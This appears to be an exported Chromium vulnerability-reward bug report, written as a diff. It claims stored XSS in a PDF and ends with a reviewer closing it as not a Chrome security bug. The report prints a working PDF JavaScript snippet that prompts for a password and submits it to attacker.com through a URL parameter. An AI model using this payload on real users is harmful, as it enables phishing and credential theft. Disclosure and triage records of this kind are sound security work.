@@ -1,0 +1,92 @@
+Issue ID: 394979330
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Stored XSS in pdf file</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p><a href="https://ai4u-files-hedte3ejgvbcatdc.a03.azurefd.net/host/files/ed76554b-5de9-20de-1d66-3a17eb6cc9f2/pop.pdf?url=https://attacker.com" data-b-widget="url" data-b-original-href="https://ai4u-files-hedte3ejgvbcatdc.a03.azurefd.net/host/files/ed76554b-5de9-20de-1d66-3a17eb6cc9f2/pop.pdf?url=https://attacker.com" data-b-redirected-href="https://www.google.com/url?q=https://ai4u-files-hedte3ejgvbcatdc.a03.azurefd.net/host/files/ed76554b-5de9-20de-1d66-3a17eb6cc9f2/pop.pdf?url%3Dhttps://attacker.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1N8C-Bj93Vcr3BcFclN1fz">https://ai4u-files-hedte3ejgvbcatdc.a03.azurefd.net/host/files/ed76554b-5de9-20de-1d66-3a17eb6cc9f2/pop.pdf?url=https://attacker.com</a></p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<ol>
+<li>
+<p>Attacker uploads malicious file on  any websites .
+*This file is injected some JS codes to send the password to attacker when user inputs .<br>
+<code>900]/Subtype/Widget/Parent&lt;&lt;/FT/Btn/T(a)&gt;&gt;/A&lt;&lt;/S/JavaScript/JS( (function(){ try { var cResponse = app.response({cQuestion: &quot;Enter your password to access this page: &quot;}); var rUrl = URL.split(&#39;?url=&#39;)[1]+ &quot;/?pass=&quot;+cResponse+&quot;&amp;path=&quot;+URL; this.submitForm(rUrl);} catch (e) {app.alert(e); } })() ) &gt;&gt; &gt;&gt;</code></p>
+</li>
+<li>
+<p>Web has the feature to read pdf files.</p>
+</li>
+<li>
+<p>Victim didn&#39;t use any pdf extension but when  receiving public file.
+<a href="https://ai4u-files-hedte3ejgvbcatdc.a03.azurefd.net/host/files/ed76554b-5de9-20de-1d66-3a17eb6cc9f2/pop.pdf?url=https://attacker.com" data-b-widget="url" data-b-original-href="https://ai4u-files-hedte3ejgvbcatdc.a03.azurefd.net/host/files/ed76554b-5de9-20de-1d66-3a17eb6cc9f2/pop.pdf?url=https://attacker.com" data-b-redirected-href="https://www.google.com/url?q=https://ai4u-files-hedte3ejgvbcatdc.a03.azurefd.net/host/files/ed76554b-5de9-20de-1d66-3a17eb6cc9f2/pop.pdf?url%3Dhttps://attacker.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1N8C-Bj93Vcr3BcFclN1fz">https://ai4u-files-hedte3ejgvbcatdc.a03.azurefd.net/host/files/ed76554b-5de9-20de-1d66-3a17eb6cc9f2/pop.pdf?url=https://attacker.com</a><br>
+The victim clicked  and entered their password, thinking that a file hosted on the domain would be safe. However, when they clicked, the information was sent to the attacker.  (chrome1.png)</p>
+</li>
+<li>
+<p>Result  ( chrome2.png)</p>
+</li>
+</ol>
+<h4>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<ul>
+<li>Any one can exploit the vulnerability because of simple vuln,  they have credentails or sensitive information</li>
+<li>I checked on Edge, Firefox but they don&#39;t work</li>
+<li>The version chrome is  133.0.6943.60</li>
+</ul>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>133.0.6943.60</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Cross-site scripting (XSS)</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>OK</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: ly...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: ly...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ly...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: ma...@chromium.org
+<p>Thank you for reporting. We do not consider execution of javascript in a PDF to be a Chrome security bug, even if the Javascript is malicious. Please see [1] for more details!</p>
+<p>[1] <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-in-a-pdf-file-mean-there_s-an-xss-vulnerability" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-in-a-pdf-file-mean-there_s-an-xss-vulnerability" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/docs/security/faq.md%23does-executing-javascript-in-a-pdf-file-mean-there_s-an-xss-vulnerability&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2yg3guGr-YXSyHPT3nI77s">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-in-a-pdf-file-mean-there_s-an-xss-vulnerability</a></p>
+
+Author: ma...@chromium.org
+public_non_google
+
+Author: ma...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
